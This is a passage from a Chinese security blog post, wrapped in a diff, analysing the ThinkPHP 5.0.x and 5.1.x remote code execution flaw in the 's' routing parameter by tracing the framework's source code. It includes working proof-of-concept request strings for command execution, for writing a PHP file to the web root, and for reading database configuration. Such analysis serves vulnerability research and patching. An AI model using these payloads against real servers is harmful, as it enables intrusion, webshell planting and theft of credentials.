@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <title>【Code Analysis】thinkphp v5.x App.php s参数RCE | 0kami&#39;s Blog</title>
+  <meta name="description" content="A Web 🐶 &amp;&amp; Code Reviewer">
+  <meta name="keywords" content>
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="shortcut icon" href="/images/avatar.jpg">
+  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="概述放假了，对thinkphp的几个RCE做一下分析，记录一下XD">
+<meta name="keywords" content="cms">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Code Analysis】thinkphp v5.x App.php s参数RCE">
+<meta property="og:url" content="http://blog.0kami.cn/2019/02/05/php安全-thinkphp-v5-x-App-php-rce/index.html">
+<meta property="og:site_name" content="0kami&#39;s Blog">
+<meta property="og:description" content="概述放假了，对thinkphp的几个RCE做一下分析，记录一下XD">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://blog.0kami.cn/attachments/93754c5f.png">
+<meta property="og:updated_time" content="2019-03-13T09:11:15.312Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【Code Analysis】thinkphp v5.x App.php s参数RCE">
+<meta name="twitter:description" content="概述放假了，对thinkphp的几个RCE做一下分析，记录一下XD">
+<meta name="twitter:image" content="http://blog.0kami.cn/attachments/93754c5f.png">
+
+  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/style.css">
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+</head>
+</html>
+<body>
+  <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+
+  <script>setLoadingBarProgress(20)</script> 
+  <header class="l_header">
+	<div class='wrapper'>
+		<div class="nav-main container container--flex">
+			<a class="logo flat-box" href='/' >
+				0kami's Blog
+			</a>
+			<div class='menu'>
+				<ul class='h-list'>
+					
+						<li>
+							<a class='flat-box nav-home' href='/'>
+								Home
+							</a>
+						</li>
+					
+						<li>
+							<a class='flat-box nav-archives' href='/archives'>
+								Archives
+							</a>
+						</li>
+					
+						<li>
+							<a class='flat-box nav-about' href='/about'>
+								About
+							</a>
+						</li>
+					
+				</ul>
+				<div class='underline'></div>
+			</div>
+			
+				<div class="m_search">
+					<form name="searchform" class="form u-search-form">
+						<input type="text" class="input u-search-input" placeholder="Search" />
+						<span class="icon icon-search"></span>
+					</form>
+				</div>
+			
+			<ul class='switcher h-list'>
+				
+					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
+				
+				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
+			</ul>
+		</div>
+		
+		<div class='nav-sub container container--flex'>
+			<a class="logo" class="flat-box" href='javascript:void(0)'>
+				Word of Forks
+			</a>
+
+			<ul class='switcher h-list'>
+				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
+				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
+				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
+			</ul>
+		</div>
+	</div>
+</header>
+<aside class="menu-phone">
+	<nav>
+		
+			<a href="/" class="nav-home nav">
+				Home
+			</a>
+		
+			<a href="/archives" class="nav-archives nav">
+				Archives
+			</a>
+		
+			<a href="/about" class="nav-about nav">
+				About
+			</a>
+		
+	</nav>
+</aside>
+
+    <script>setLoadingBarProgress(40);</script>
+  <div class="l_body">
+    <div class='container clearfix'>
+      <div class='l_main'>
+        <article id="post-php安全-thinkphp-v5-x-App-php-rce"
+  class="post white-box article-type-post"
+  itemscope itemprop="blogPost">
+	<section class='meta'>
+	<h2 class="title">
+  	<a href="/2019/02/05/php安全-thinkphp-v5-x-App-php-rce/">
+    	【Code Analysis】thinkphp v5.x App.php s参数RCE
+    </a>
+  </h2>
+	<time>
+	  Feb 5, 2019
+	</time>
+	
+    
+    <div class='cats'>
+        <a href="/categories/codereview/">codereview</a>
+    </div>
+
+	</section>
+	
+		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp-v5-0-x"><span class="toc-number">2.</span> <span class="toc-text">thinkphp v5.0.x</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞相关信息"><span class="toc-number">2.0.1.</span> <span class="toc-text">漏洞相关信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.0.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#关于thinkphp的url解析方式"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">关于thinkphp的url解析方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞成因点"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">漏洞成因点</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp-v5-1-x"><span class="toc-number">3.</span> <span class="toc-text">thinkphp v5.1.x</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#版本信息"><span class="toc-number">3.0.1.</span> <span class="toc-text">版本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></section>
+	
+	<section class="article typo">
+  	<div class="article-entry" itemprop="articleBody">
+    	<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>放假了，对thinkphp的几个RCE做一下分析，记录一下XD<br><a id="more"></a></p>
+<h2 id="thinkphp-v5-0-x"><a href="#thinkphp-v5-0-x" class="headerlink" title="thinkphp v5.0.x"></a>thinkphp v5.0.x</h2><h4 id="漏洞相关信息"><a href="#漏洞相关信息" class="headerlink" title="漏洞相关信息"></a>漏洞相关信息</h4><p>漏洞版本：&lt;= 5.0.22<br>补丁：<a href="https://github.com/top-think/framework/commit/4cbc0b5e93314446243ebc7d5f005f9c32864737" target="_blank" rel="noopener">版本更新 · top-think/framework@4cbc0b5 · GitHub</a><br>问题点：library/think/App.php</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="关于thinkphp的url解析方式"><a href="#关于thinkphp的url解析方式" class="headerlink" title="关于thinkphp的url解析方式"></a>关于thinkphp的url解析方式</h5><p>THINKPHP支持使用PATHINFO的方式来访问具体的模块、类、方法，如<code>index.php/module/controller/action</code><br>对于不支持PATHINFO的服务器，THINKPHP提供了兼容模式<code>?s=/module/controller/action</code>的方式来访问<br>而这次的漏洞成因就是在于兼容模式处理时存在的问题。<br>首先看 <code>thinkphp/library/think/Request.php</code>的<code>pathinfo</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)])) &#123;</span><br><span class="line">            <span class="comment">// 判断URL里面是否有兼容模式参数</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = $_GET[Config::get(<span class="string">'var_pathinfo'</span>)];</span><br><span class="line">            <span class="keyword">unset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">            <span class="comment">// CLI模式下 index.php module/controller/action/params/...</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = <span class="keyword">isset</span>($_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>]) ? $_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>] : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分析PATHINFO信息</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>($_SERVER[<span class="string">'PATH_INFO'</span>]) ? <span class="string">'/'</span> : ltrim($_SERVER[<span class="string">'PATH_INFO'</span>], <span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pathinfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当GET请求中带有s参数(config中默认var_pathinfo为s)，将pathinfo设置为s的参数值<br>有了pathinfo值，我们再找到具体的解析url的函数，<code>thinkphp/library/think/Route.php</code>的<code>parseUrl</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">        $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">        <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">        $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">    &#125;</span><br><span class="line">    $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">    <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">    $route            = [<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>];</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中parseUrl函数的<code>$url</code>为上面拿到的pathinfo，<code>$depr</code>为默认的分割符<br>首先对<code>$url</code>替换分割符为<code>|</code>，再输入到<code>parseUrlPath</code>函数(根据<code>/</code>分割)，该函数对pathinfo进行分割，产生<code>module</code>、<code>controller</code>、<code>action</code><br>那么现在来看rce的Poc<code>?s=/index/\think\app/invokefunction</code>=&gt;<code>[module:index,controller:\think\app,action:invokefunction]</code><br>其中controller=&gt;\think\app，是php命名空间的表示方式，\think\app实际调用library/think/App.php，后面的action实际调用的App.php中的invokefunction函数</p>
+<h5 id="漏洞成因点"><a href="#漏洞成因点" class="headerlink" title="漏洞成因点"></a>漏洞成因点</h5><p>上面分析了thinkphp的兼容模式是如何处理s参数的，并且处理存在一个问题就是可以伪造controller，导致实际调用为其他的类和函数<br>看一下拿到module、controller、action后系统的处理<br>thinkphp/library/think/App.php 的 module函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认过滤机制</span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(<span class="comment">// 实例化controller类</span></span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前操作名</span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// 执行操作方法</span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 空操作</span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 操作不存在</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);<span class="comment">// 调用函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>拿到实例化后的对象和方法，动态调用<code>invokeMethod</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span><span class="params">($method, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($method)) &#123;</span><br><span class="line">        $class   = is_object($method[<span class="number">0</span>]) ? $method[<span class="number">0</span>] : <span class="keyword">self</span>::invokeClass($method[<span class="number">0</span>]);</span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($class, $method[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 静态方法</span></span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $args = <span class="keyword">self</span>::bindParams($reflect, $vars);<span class="comment">// 获取参数内容 这里获取到参数用做method的参数输入</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">self</span>::$debug &amp;&amp; Log::record(<span class="string">'[ RUN ] '</span> . $reflect-&gt;class . <span class="string">'-&gt;'</span> . $reflect-&gt;name . <span class="string">'[ '</span> . $reflect-&gt;getFileName() . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs(<span class="keyword">isset</span>($class) ? $class : <span class="keyword">null</span>, $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里使用bindParams函数从get或post中获取到对应的内容，需要注意的是，做参数嵌入时，需要以函数的参数名为键<br>如invokeFunction的参数为<code>$function</code>、<code>$vars</code>，那么在参数中就需要以<code>function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxx</code><br>即poc的后半部分<code>function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</code><br>所以调用链现在变成了</p>
+<ol>
+<li>动态调用\think\app invokeFunction函数</li>
+<li>提供function=call_user_func_array作为invokeFunction动态调用的参数，所以下一步调用call_user_func_array函数</li>
+<li>call_user_func_array的参数为system函数，system函数的参数为ls -l，所以这里用了2维数组</li>
+</ol>
+<p><img src="/attachments/93754c5f.png" alt="93754c5f.png"><br>所以我们可以发散一下思维，我们其实不单单可以调用\think\app这个类，如果其他的类可以任意调用其他函数，或者是调用命令执行函数，同样具有危害性<br>如任意命令执行<br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>任意文件写入，生成在index.php同一级目录<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br>获取配置信息<br><code>?s=index/\think\config/get&amp;name=database.username</code></p>
+<h2 id="thinkphp-v5-1-x"><a href="#thinkphp-v5-1-x" class="headerlink" title="thinkphp v5.1.x"></a>thinkphp v5.1.x</h2><h4 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h4><p>版本：&lt;= v5.1.30<br>补丁信息：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">修正控制器调用 · top-think/framework@802f284 · GitHub</a><br>漏洞点：thinkphp/library/think/route/dispatch/Module.php</p>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>原理同v5.0.x版本类似，也是由于s参数带入的路径解析存在安全问题导致的任意代码执行<br>先看App::run()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化应用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;dispatch;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">// 路由检测</span></span><br><span class="line">            $dispatch = <span class="keyword">$this</span>-&gt;routeCheck()-&gt;init();<span class="comment">// 处理module、controller、action</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录当前调度信息</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (HttpResponseException $exception) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">null</span>;</span><br><span class="line">        $data     = $exception-&gt;getResponse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;middleware-&gt;add(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($dispatch, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_null($data) ? $dispatch-&gt;run() : $data;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $response = <span class="keyword">$this</span>-&gt;middleware-&gt;dispatch(<span class="keyword">$this</span>-&gt;request);<span class="comment">// 动态调用controller、action</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>App::run()函数体现了程序的一个主要流程，从路径的解析到动态解析执行相应的控制器及方法<br>先来看看第13行，获取相应的路径信息<br>thinkphp/library/think/App.php routeCheck()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测路由缓存</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取应用调度信息</span></span><br><span class="line">    $path = <span class="keyword">$this</span>-&gt;request-&gt;path();</span><br><span class="line">    <span class="comment">// 从Request.php path提取urlpath 具体从pathinfo()，优先获取$_GET[$this-&gt;config['var_pathinfo']]</span></span><br><span class="line">    <span class="comment">// var_pathinfo 默认为s</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否强制路由模式</span></span><br><span class="line">    $must = !is_null(<span class="keyword">$this</span>-&gt;routeMust) ? <span class="keyword">$this</span>-&gt;routeMust : <span class="keyword">$this</span>-&gt;route-&gt;config(<span class="string">'url_route_must'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路由检测 返回一个Dispatch对象</span></span><br><span class="line">    $dispatch = <span class="keyword">$this</span>-&gt;route-&gt;check($path, $must);<span class="comment">//返回UrlDispatch类实例，从dispatch类处继承</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $dispatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第7行从s参数中获取路由路径(s为var_pathinfo的默认值)，在调用routeCheck函数后返回一个UrlDispatch，之后调用了Url类的init函数<br>thinkphp/library/think/route/dispatch/Url.php init<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析默认的URL规则</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;parseUrl(<span class="keyword">$this</span>-&gt;dispatch);</span><br><span class="line">    <span class="comment">// parseUrl函数处理参数值(以/分割，传入|也行会被替换成/，最终由/来分割)，返回[module,controller,action]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>返回Module对象，继承自Dispatch对象，并且调用了init函数，将解析后的路由填充到dispatch，供后面App::run()函数动态调用dispatch的run函数，v5.1版本的调用链复杂了一点，但是其实内容同v5.0版本类似<br>Dispatch::run()函数调用了Module::exec()函数<br>thinkphp/library/think/route/dispatch/Module.php exec()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span 